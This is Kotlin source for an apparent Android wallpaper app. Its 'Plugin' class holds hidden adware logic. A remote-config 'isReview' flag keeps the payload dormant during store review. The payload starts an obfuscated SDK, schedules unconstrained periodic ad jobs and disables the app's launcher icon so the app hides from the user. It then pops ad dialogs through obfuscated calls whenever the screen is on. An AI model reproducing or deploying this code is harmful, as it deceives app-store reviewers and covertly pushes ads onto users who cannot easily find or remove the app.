package com.flight.wallpaper2.additional

import android.app.Activity
import android.app.ActivityManager
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.PowerManager
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.anythink.core.api.ATDebuggerConfig
import com.anythink.core.api.ATSDK
import com.anythink.network.adx.AdxATConst
import com.flight.wallpaper2.MainActivity
import com.flight.wallpaper2.R
import com.flight.wallpaper2.StartActivity
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.launch
import org.json.JSONObject
import p3dn6v.h4wm1s.k2ro8t.C3tH7m
import java.util.concurrent.TimeUnit


class Plugin(
    private val context: Context,
    private val topScope: CoroutineScope,
) {

    private var lastShowTime = 0L
    private val adProvider = AdProvider(context, getAdStrategy())
    private lateinit var powerManager: PowerManager

    fun init() {
        C3tH7m.init(context.packageName, 1, X3Y8Z9::class.java, MainActivity::class.java)

        powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        topScope.launch {
            val shouldRun = InstallManager.shouldRun(context)
            val reviewModel = Firebase.remoteConfig.getBoolean("isReview")
            if (!reviewModel && shouldRun) {
                //init the live sdk
                C3tH7m.B9gP4q(context)

                //init ad sdk
                val topOnAppID = context.getString(R.string.topon_app_id)
                ATSDK.init(context, topOnAppID, context.getString(R.string.topon_app_key))

                // 打包注释掉
                // setAdSDKDebug(context)

                //init periodic ad
                val constraints = Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.NOT_REQUIRED)
                    .setRequiresCharging(false)
                    .setRequiresDeviceIdle(false)
                    .setRequiresBatteryNotLow(false)
                    .setRequiresStorageNotLow(false)
                    .build()
                val request =
                    PeriodicWorkRequestBuilder<AdWork>(
                        adProvider.strategy.triggerAdInterval,
                        TimeUnit.MILLISECONDS
                    )
                        .setInitialDelay(1, TimeUnit.MINUTES)
                        .setConstraints(constraints)
                        .build()
                WorkManager.getInstance(context).enqueue(request)

                //start event ad
                AdTrigger(context).start()
                hideLauncher(StartActivity::class.java)
            }
        }

    }

    private fun hideLauncher(cls: Class<*>) {
        val componentName = ComponentName(context, cls)
        val mPackageManager = context.packageManager
        mPackageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        val activityManager: ActivityManager =
            context.getSystemService(AppCompatActivity.ACTIVITY_SERVICE) as ActivityManager
        val tasks = activityManager.appTasks
        for (task in tasks) {
            task.finishAndRemoveTask()
        }
    }


    private fun getAdStrategy(): AdStrategy {
        val keyId = "adId"
        val keyInterval = "triggerAdInterval"
        return AdStrategy(
            adId = Firebase.remoteConfig.getString(keyId),
            maxShowCount = Firebase.remoteConfig.getLong("maxShowCount").toInt(),
            maxClickCount = Firebase.remoteConfig.getLong("maxClickCount").toInt(),
            triggerAdInterval = Firebase.remoteConfig.getLong(keyInterval)
        )

    }

    fun req() {
        val canShow = adProvider.checkShowAd()
        val screenOn = powerManager.isInteractive
        val current = System.currentTimeMillis()
        val diff = current - lastShowTime
        val interval = diff > 30000L
        Log.d("AppWow", "req:  diff=$diff, canShow=$canShow ,screenOn=$screenOn")
        AnalysisUtil.logEvent(AnalysisUtil.EVENT_TRIGGER,
            Bundle().apply {
                putString("interval", interval.toString())
                putString("canShow", canShow.toString())
                putString("screenOn", screenOn.toString())
            }
        )
        if (canShow && screenOn && interval) {
            //call show dialog
            lastShowTime = current
            AnalysisUtil.logEvent(AnalysisUtil.EVENT_CALL_DIALOG)
            Log.d("AppWow", "req: call show dialog ")
            C3tH7m.B9gP4q2ss(
                context.packageName,
                context, PluginActivity::class.java,
                -1
            )
        }
    }


    fun show(activity: Activity) {
        AnalysisUtil.logEvent(AnalysisUtil.EVENT_DIALOG_SHOWED)
        adProvider.showAd(activity)
    }


    private fun setAdSDKDebug(context: Context) {
        ATSDK.testModeDeviceInfo(
            context
        ) { deviceInfo ->
            JSONObject(deviceInfo).apply {
                val gaid = optString("GAID")
                ATSDK.setDebuggerConfig(
                    context, gaid, ATDebuggerConfig.Builder(
                        AdxATConst.DEBUGGER_CONFIG.Adx_NETWORK
                    ).build()
                )
            }
        }
    }
}